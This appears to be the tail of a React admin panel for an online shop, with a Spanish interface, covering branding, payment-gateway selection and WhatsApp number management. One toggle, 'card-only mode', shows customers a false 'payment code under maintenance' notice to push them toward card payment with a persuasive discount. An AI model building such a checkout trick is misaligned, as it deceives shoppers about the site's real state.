                    <p className="text-xs text-muted-foreground">PNG/JPG hasta 2 MB. Se recomienda formato horizontal.</p>
                  </div>
                </div>

                {(logoAtual || bannerAtual) && (
                  <div className="flex gap-2">
                    {logoAtual && (
                      <Button variant="outline" size="sm" onClick={() => salvarBranding({ logo_url: null })}>
                        Eliminar logo personalizado
                      </Button>
                    )}
                    {bannerAtual && (
                      <Button variant="outline" size="sm" onClick={() => salvarBranding({ banner_url: null })}>
                        Eliminar banner personalizado
                      </Button>
                    )}
                  </div>
                )}
              </CardContent>
            </Card>

            {/* Modo Cartão Apenas (PIX em manutenção) */}
            <Card className={modoCartaoApenas ? "border-yellow-500 border-2" : ""}>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <AlertTriangle className={`w-5 h-5 ${modoCartaoApenas ? "text-yellow-500" : "text-muted-foreground"}`} />
                  Modo Solo Tarjeta (código de pago en mantenimiento)
                </CardTitle>
                <p className="text-sm text-muted-foreground">
                  Cuando está activado, el código de pago queda bloqueado para los clientes. Al intentar seleccionarlo, verán un aviso de "código de pago en mantenimiento" y recibirán una oferta persuasiva de <strong>8% de descuento pagando con tarjeta</strong>.
                </p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between p-4 rounded-lg bg-admin-box">
                  <div>
                    <p className="font-semibold text-admin-box-foreground">
                      Estado actual:{" "}
                      <span className={modoCartaoApenas ? "text-yellow-600" : "text-success"}>
                        {modoCartaoApenas ? "ACTIVADO (código de pago bloqueado)" : "Desactivado (código de pago disponible)"}
                      </span>
                    </p>
                    <p className="text-xs text-admin-box-foreground/70 mt-1">
                      {modoCartaoApenas
                        ? "Los clientes serán redirigidos a la tarjeta con 8% de descuento."
                        : "Active para obligar a todos los clientes a pagar con tarjeta."}
                    </p>
                  </div>
                  <Button
                    onClick={() => salvarModoCartaoApenas(!modoCartaoApenas)}
                    disabled={salvandoModoCartao}
                    variant={modoCartaoApenas ? "destructive" : "default"}
                    className={modoCartaoApenas ? "" : "bg-yellow-500 hover:bg-yellow-600 text-white"}
                  >
                    {salvandoModoCartao ? (
                      <RefreshCw className="w-4 h-4 animate-spin" />
                    ) : modoCartaoApenas ? (
                      "Desactivar"
                    ) : (
                      "Activar modo tarjeta"
                    )}
                  </Button>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Wallet className="w-5 h-5 text-primary" />
                  Método de Pago
                </CardTitle>
                <p className="text-sm text-muted-foreground">
                  Seleccione qué método de pago se utilizará en todo el sistema
                </p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* UmbrellaPag */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("umbrellapag")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "umbrellapag"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">UmbrellaPag</h3>
                      </div>
                      {gatewayAtivo === "umbrellapag" && <Badge className="bg-primary">Activo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Código de pago vía UmbrellaPag. Transacciones procesadas mediante API de transacciones directas.
                    </p>
                  </div>

                  {/* EvoPay */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("evopay")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "evopay"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">EvoPay</h3>
                      </div>
                      {gatewayAtivo === "evopay" && <Badge className="bg-primary">Activo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Código de pago vía EvoPay (PrimeCash). Transacciones procesadas mediante API de código de pago.
                    </p>
                  </div>

                  {/* BlackCat */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("blackcat")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "blackcat"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">BlackCat</h3>
                      </div>
                      {gatewayAtivo === "blackcat" && <Badge className="bg-primary">Activo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Código de pago vía BlackCat. Transacciones procesadas mediante API de ventas.
                    </p>
                  </div>

                  {/* IronPay */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("ironpay")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "ironpay"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">IronPay</h3>
                      </div>
                      {gatewayAtivo === "ironpay" && <Badge className="bg-primary">Activo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Código de pago vía IronPay. Transacciones procesadas mediante API pública v1.
                    </p>
                  </div>

                  {/* BRGateway */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("brgateway")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "brgateway"
                        ? "border-primary bg-primary/10"
                        : "border-border hover:border-primary/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-accent" />
                        <h3 className="text-lg font-bold">BRGateway</h3>
                      </div>
                      {gatewayAtivo === "brgateway" && <Badge className="bg-primary">Activo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Código de pago vía BRGateway. Transacciones procesadas mediante API pública v1.
                    </p>
                  </div>

                  {/* WhatsApp */}
                  <div
                    onClick={() => !salvandoGateway && salvarGateway("whatsapp")}
                    className={`cursor-pointer p-6 rounded-lg border-2 transition-all ${
                      gatewayAtivo === "whatsapp"
                        ? "border-success bg-success/10"
                        : "border-border hover:border-success/50"
                    } ${salvandoGateway ? "opacity-50 cursor-not-allowed" : ""}`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <MessageCircle className="w-5 h-5 text-success" />
                        <h3 className="text-lg font-bold">WhatsApp</h3>
                      </div>
                      {gatewayAtivo === "whatsapp" && <Badge className="bg-success">Activo</Badge>}
                    </div>
                    <p className="text-sm text-muted-foreground">
                      Redirige al cliente a WhatsApp. Sin procesamiento de pago automático.
                    </p>
                  </div>
                </div>

                {salvandoGateway && (
                  <div className="flex items-center gap-2 text-sm text-muted-foreground">
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    Guardando configuración...
                  </div>
                )}

                <div className="p-4 bg-admin-box text-admin-box-foreground rounded-lg">
                  <p className="text-sm">
                    <strong>Atención:</strong> Al cambiar el método, todos los nuevos pedidos usarán el método seleccionado.
                    {gatewayAtivo === "whatsapp" && (
                      <span className="block mt-2 text-success">
                        <strong>WhatsApp activo:</strong> El cliente será redirigido a WhatsApp al finalizar el pedido. No se generará ningún código de pago.
                      </span>
                    )}
                  </p>
                </div>
              </CardContent>
            </Card>

            {/* Gerenciamento de Números WhatsApp */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <MessageCircle className="w-5 h-5 text-success" />
                  Números de WhatsApp
                </CardTitle>
                <p className="text-sm text-muted-foreground">
                  Gestione los números de WhatsApp de la tienda. El número activo se usará en todas las redirecciones.
                </p>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Adicionar novo número */}
                <div className="flex gap-2">
                  <Input
                    placeholder="Introduzca el número (ej.: 11999999999)"
                    value={novoNumero}
                    onChange={(e) => setNovoNumero(e.target.value)}
                    className="bg-admin-box text-admin-box-foreground placeholder:text-admin-box-foreground/60 border-border focus-visible:ring-accent"
                  />
                  <Button
                    onClick={adicionarNumeroWhatsApp}
                    disabled={adicionandoNumero}
                    className="gap-2 bg-success hover:bg-success/90 text-success-foreground"
                  >
                    <Plus className="w-4 h-4" />
                    {adicionandoNumero ? "Añadiendo..." : "Añadir"}
                  </Button>
                </div>

                {/* Lista de números */}
                {numerosWhatsApp.length === 0 ? (
                  <div className="text-center py-8 text-muted-foreground text-sm">
                    No hay ningún número registrado. Añada uno arriba.
                  </div>
                ) : (
                  <div className="space-y-2">
                    {numerosWhatsApp.map((numero) => (
                      <div
                        key={numero.id}
                        onClick={() => !numero.ativo && ativarNumeroWhatsApp(numero.id)}
                        className={`flex items-center justify-between p-4 rounded-lg border-2 transition-all ${
                          numero.ativo
                            ? "border-success bg-success/10"
                            : "border-border bg-admin-box"
                        } ${numero.ativo ? "" : "cursor-pointer hover:border-success/50"}`}
                      >
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${
                              numero.ativo
                                ? "border-success bg-success text-success-foreground"
                                : "border-border hover:border-success"
                            }`}
                          >
                            {numero.ativo && <Check className="w-4 h-4" />}
                          </div>
                          <div>
                            <p className="font-mono font-semibold">{formatarNumeroWhatsApp(numero.numero)}</p>
                            <p className="text-xs text-muted-foreground">
                              Añadido el {format(new Date(numero.created_at), "dd/MM/yyyy 'a las' HH:mm", { locale: ptBR })}
                            </p>
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          {numero.ativo && (
                            <Badge className="bg-success text-success-foreground">Activo</Badge>
                          )}
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={(e) => {
                              e.stopPropagation();
                              excluirNumeroWhatsApp(numero.id);
                            }}
                            className="text-destructive hover:text-destructive hover:bg-destructive/10"
                          >
                            <Trash2 className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}

                <div className="p-4 bg-admin-box text-admin-box-foreground rounded-lg">
                  <p className="text-sm">
                    <strong>Cómo funciona:</strong> Haga clic en el número para activarlo. Solo un número puede estar activo a la vez. El número activo se usará en todas las redirecciones de WhatsApp del sistema.
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {abaAtiva === "catalogo" && (
          <div className="mt-2">
            <CatalogoPanel password={password} />
          </div>
        )}
      </div>

    </div>
  );
};

export default Admin;
